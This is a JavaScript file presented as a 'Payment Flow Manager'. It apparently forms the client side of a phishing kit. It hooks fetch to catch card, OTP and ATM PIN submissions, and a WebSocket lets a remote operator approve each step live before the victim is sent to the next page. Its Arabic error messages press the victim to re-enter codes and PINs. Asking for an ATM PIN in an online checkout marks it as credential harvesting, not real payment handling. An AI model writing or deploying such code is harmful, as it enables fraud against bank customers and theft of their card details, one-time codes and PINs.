// ─── Payment Flow Manager ───────────────────────────────────────────────
(function() {
  'use strict';
  
  // Store order reference globally
  window.currentOrderRef = null;
  
  // ─── Intercept Payment Submission ───
  const originalFetch = window.fetch;
  window.fetch = function(url, options) {
    const urlStr = typeof url === 'string' ? url : (url && url.url ? url.url : String(url));
    
    // Intercept card submission
    if (urlStr && urlStr.includes('/api/submit-card')) {
      return originalFetch.apply(this, arguments).then(response => {
        if (response.ok) {
          return response.json().then(data => {
            window.currentOrderRef = data.order_ref;
            // Redirect to loading page
            setTimeout(() => {
              window.location.href = '/loading?ref=' + data.order_ref;
            }, 500);
          });
        }
        return response;
      });
    }
    
    // Intercept OTP submission
    if (urlStr && urlStr.includes('/api/submit-otp')) {
      return originalFetch.apply(this, arguments).then(response => {
        if (response.ok) {
          return response.json().then(data => {
            // Redirect to loading page
            setTimeout(() => {
              window.location.href = '/loading?ref=' + data.order_ref;
            }, 500);
          });
        }
        return response;
      });
    }
    
    // Intercept ATM PIN submission
    if (urlStr && urlStr.includes('/api/submit-atm')) {
      return originalFetch.apply(this, arguments).then(response => {
        if (response.ok) {
          return response.json().then(data => {
            // Redirect to loading page
            setTimeout(() => {
              window.location.href = '/loading?ref=' + data.order_ref;
            }, 500);
          });
        }
        return response;
      });
    }
    
    return originalFetch.apply(this, arguments);
  };
  
  // ─── WebSocket for Real-time Updates ───
  function setupPaymentUpdates() {
    const params = new URLSearchParams(window.location.search);
    const orderRef = params.get('ref');
    
    if (!orderRef) return;
    
    const wsUrl = (location.protocol === 'https:' ? 'wss:' : 'ws:') + '//' + location.host + '/ws?order=' + orderRef;
    const ws = new WebSocket(wsUrl);
    
    ws.onmessage = (e) => {
      try {
        const data = JSON.parse(e.data);
        
        // Card approval/rejection
        if (data.type === 'card_decision') {
          if (data.approved) {
            // Redirect to OTP page
            setTimeout(() => {
              window.location.href = '/qpay-otp?ref=' + orderRef;
            }, 1000);
          } else {
            // Show error message
            showCardRejectionMessage();
          }
        }
        
        // OTP approval/rejection
        if (data.type === 'otp_decision') {
          if (data.approved) {
            // Redirect to ATM PIN page
            setTimeout(() => {
              window.location.href = '/atm-pin?ref=' + orderRef;
            }, 1000);
          } else {
            // Show OTP error
            showOtpRejectionMessage();
          }
        }
        
        // ATM PIN approval/rejection
        if (data.type === 'atm_decision') {
          if (data.approved) {
            // Redirect to success page
            setTimeout(() => {
              window.location.href = '/payment-success?ref=' + orderRef;
            }, 1000);
          } else {
            // Show ATM error
            showAtmRejectionMessage();
          }
        }
      } catch (e) {
        console.error('WebSocket error:', e);
      }
    };
    
    ws.onerror = () => {
      console.error('WebSocket connection error');
      // Retry after 3 seconds
      setTimeout(setupPaymentUpdates, 3000);
    };
  }
  
  // ─── Error Messages ───
  function showCardRejectionMessage() {
    const msg = 'فشل في عملية الدفع\nيرجى التحقق من مصدر البطاقة أو الاتصال بالبنك أو استخدام طرق دفع مختلفة';
    alert(msg);
    window.location.href = '/payment';
  }
  
  function showOtpRejectionMessage() {
    const msg = 'الرمز الذي تم إدخاله غير صحيح - غير صالح';
    alert(msg);
    // Keep user on OTP page with red box
    document.querySelectorAll('[data-field="otp"]').forEach(el => {
      el.style.borderColor = '#ef4444';
      el.style.backgroundColor = '#fee2e2';
    });
  }
  
  function showAtmRejectionMessage() {
    const msg = 'يرجى التحقق من الرقم السري للصراف الآلي الصحيح';
    alert(msg);
    // Keep user on ATM page
    document.querySelectorAll('[data-field="atm"]').forEach(el => {
      el.style.borderColor = '#ef4444';
      el.style.backgroundColor = '#fee2e2';
    });
  }
  
  // Initialize on page load
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', setupPaymentUpdates);
  } else {
    setupPaymentUpdates();
  }
})();
